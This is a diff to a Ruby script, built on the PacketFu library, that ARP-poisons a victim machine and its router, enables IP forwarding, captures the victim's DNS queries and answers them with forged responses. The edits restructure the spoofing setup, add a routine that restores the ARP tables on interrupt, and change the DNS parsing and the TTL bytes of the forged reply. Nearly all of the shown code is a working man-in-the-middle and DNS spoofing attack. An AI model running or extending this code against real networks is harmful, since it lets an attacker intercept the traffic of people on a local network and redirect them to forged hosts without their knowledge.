@@ -9,7 +9,9 @@ unless (ARGV.size == 2)
 	exit
 end
 
-def initA(intface, victimIP)
+
+def init(intface, victimIP)
+
 	@interface = intface
 	@victimIP = victimIP
 	@routerIP = "192.168.0.100"
@@ -18,33 +20,61 @@ def initA(intface, victimIP)
 	@routerMAC = PacketFu::Utils.arp(@routerIP, :iface => @interface)
 
 	# Construct the target's packet
-	arp_packet_target = PacketFu::ARPPacket.new()
-	arp_packet_target.eth_saddr = @srcMAC[:eth_saddr]       # sender's MAC address
-	arp_packet_target.eth_daddr = @victimMAC       		# target's MAC address
-	arp_packet_target.arp_saddr_mac = @srcMAC[:eth_saddr]   # sender's MAC address
-	arp_packet_target.arp_daddr_mac = @victimMAC   		# target's MAC address
-	arp_packet_target.arp_saddr_ip = @routerIP        	# router's IP
-	arp_packet_target.arp_daddr_ip = @victimIP         	# target's IP
-	arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
+	@arp_packet_target = PacketFu::ARPPacket.new()
+	@arp_packet_target.eth_saddr = @srcMAC[:eth_saddr]       # sender's MAC address
+	@arp_packet_target.eth_daddr = @victimMAC       		# target's MAC address
+	@arp_packet_target.arp_saddr_mac = @srcMAC[:eth_saddr]   # sender's MAC address
+	@arp_packet_target.arp_daddr_mac = @victimMAC   		# target's MAC address
+	@arp_packet_target.arp_saddr_ip = @routerIP        	# router's IP
+	@arp_packet_target.arp_daddr_ip = @victimIP         	# target's IP
+	@arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
 	 
 	# Construct the router's packet
-	arp_packet_router = PacketFu::ARPPacket.new()
-	arp_packet_router.eth_saddr = @srcMAC[:eth_saddr]       # sender's MAC address
-	arp_packet_router.eth_daddr = @routerMAC       		# router's MAC address
-	arp_packet_router.arp_saddr_mac = @srcMAC[:eth_saddr]   # sender's MAC address
-	arp_packet_router.arp_daddr_mac = @routerMAC   		# router's MAC address
-	arp_packet_router.arp_saddr_ip = @victimIP         	# target's IP
-	arp_packet_router.arp_daddr_ip = @routerIP       	# router's IP
-	arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
+	@arp_packet_router = PacketFu::ARPPacket.new()
+	@arp_packet_router.eth_saddr = @srcMAC[:eth_saddr]       # sender's MAC address
+	@arp_packet_router.eth_daddr = @routerMAC       		# router's MAC address
+	@arp_packet_router.arp_saddr_mac = @srcMAC[:eth_saddr]   # sender's MAC address
+	@arp_packet_router.arp_daddr_mac = @routerMAC   		# router's MAC address
+	@arp_packet_router.arp_saddr_ip = @victimIP         	# target's IP
+	@arp_packet_router.arp_daddr_ip = @routerIP       	# router's IP
+	@arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
 
 	# Initialize IP Forwarding
 	`echo 1 > /proc/sys/net/ipv4/ip_forward`
 
 end
 
+def revertArpPackets()
+	
+	#Construct the target's packet
+	arp_packet_target = PacketFu::ARPPacket.new()
+	arp_packet_target.eth_saddr = @routerMAC 
+	arp_packet_target.eth_daddr = @victimMAC 
+	arp_packet_target.arp_saddr_mac = @routerMAC
+	arp_packet_target.arp_daddr_mac = @victimMAC
+	arp_packet_target.arp_saddr_ip = @routerIP
+	arp_packet_target.arp_daddr_ip = @victimIP
+	arp_packet_target.arp_opcode = 2
+	 
+	# Construct the router's packet
+	arp_packet_router = PacketFu::ARPPacket.new()
+	arp_packet_router.eth_saddr = @victimMAC
+	arp_packet_router.eth_daddr = @routerMAC
+	arp_packet_router.arp_saddr_mac = @victimMAC
+	arp_packet_router.arp_daddr_mac = @routerMAC
+	arp_packet_router.arp_saddr_ip = @victimIP 
+	arp_packet_router.arp_daddr_ip = @routerIP
+	arp_packet_router.arp_opcode = 2
+	
+	arp_packet_target.to_w(@interface)
+	arp_packet_router.to_w(@interface)
+	
+end
+
 def spoofThread(arp_packet_victim, arp_packet_router)
 
-	while true
+	caught=false
+	while caught==false do
 		sleep 2
 		arp_packet_victim.to_w(@interface)
 		arp_packet_router.to_w(@interface)
@@ -55,8 +85,8 @@ def getDomain(payload)
 	domainName = ""
 	
 	while true
-		#length = payload[0].unpack('c*')[0]
-		length = payload[0].to_i
+		length = payload[0].unpack('c*')[0]
+		#length = payload[0].to_i
 		if(length != 0)
 			domainName += payload[1, length] + "."
 			payload += payload[length + 1..-1]
@@ -76,7 +106,6 @@ def dnsResponse
 	udp_packet.eth_daddr = @victimMAC
 	udp_packet.ip_daddr = @victimIP
 	udp_packet.ip_saddr = @packet.ip_daddr
-	udp_packet.udp_src = @packet.udp_dst
 	udp_packet.udp_dst = @packet.udp_src
 
 	# Parse Transaction ID
@@ -93,7 +122,7 @@ def dnsResponse
 	udp_packet.payload += "\x00\x00\x01\x00\x01"
 	udp_packet.payload += "\xc0\x0c"
 	udp_packet.payload += "\x00\x01\x00\x01"
-	udp_packet.payload += "\x00\x00\x00\xc0"
+	udp_packet.payload += "\x00\x00\x00\x22"
 	udp_packet.payload += "\x00\x04"
 
 	#ip = @srcMAC[:ip_saddr].split('.')
@@ -121,10 +150,13 @@ begin
 	puts "Victim IP: " + victIP
 	puts "Interface: " + intface
 
-	initA(intface, victIP)
+
+	init(intface, victIP)
+
 
 	puts "Source MAC: " + @srcMAC[:eth_saddr].to_s
 	puts "Dest MAC: " + @victimMAC.to_s
+	puts "Router's MAC: " + @routerMAC.to_s
 
 	puts "Initiating ARP thread..."
 	arp_spoof_thread = Thread.new{spoofThread(@arp_packet_target, @arp_packet_router)}
@@ -137,6 +169,7 @@ begin
 
 	puts "Capturing DNS Queries..."
 	capture.stream.each do |packet|
+		puts "Captured packet"
 
 		@packet = PacketFu::Packet.parse(packet)
 		dnsQuery = @packet.payload[2].unpack('h*')[0].chr + @packet.payload[3].unpack('h*')[0].chr
@@ -150,11 +183,12 @@ begin
 			dnsResponse
 		end
 	end # End do packet
-
+	arp_spoof_thread.join
 	# Catch interrupt
 	rescue Interrupt
 		puts "\nDNS spoof interrupt detected."
 		Thread.kill(arp_spoof_thread)
+		revertArpPackets()
 		`echo 0 > /proc/sys/net/ipv4/ip_forward`
 		exit 0
 
